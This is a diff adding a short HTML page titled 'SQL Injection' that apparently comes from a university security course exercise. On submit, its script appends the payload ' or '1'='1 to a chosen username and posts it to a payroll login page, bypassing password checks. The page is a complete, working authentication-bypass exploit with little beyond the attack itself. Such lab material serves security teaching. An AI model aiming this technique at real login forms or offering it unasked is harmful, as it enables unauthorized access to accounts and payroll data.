@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+    <title>SQL Injection</title>
+    <script>
+      function f() {
+        document.getElementById('login').value = document.getElementById('targetlogin').value + "' or '1'='1";
+        return true;
+      }
+    </script>
+  </head>
+  <body>
+    <form action="http://payroll.gatech.edu/index.php" onsubmit="return f();" method="POST">
+      <input type="hidden" name="RmFsbDIwMTlUYXJnZXQzRWFzdGVyRWdnLUl0J3NBU2VjcmV0DQo" value="RmFsbDIwMTlUYXJnZXQzRWFzdGVyRWdnLUl0J3NBU2VjcmV0DQo" />
+      <input type="hidden" name="secret" value="whatdoido?" />
+      <input type="hidden" name="action" value="login" />
+      <input type="hidden" name="pw" value="nah" />
+      <input type="hidden" id="login" name="login" value="" />
+      <input id="targetlogin" value="username" />
+      <button id="exploit">Hold onto your butts!</button>
+    </form>
+  </body>
+</html>
+
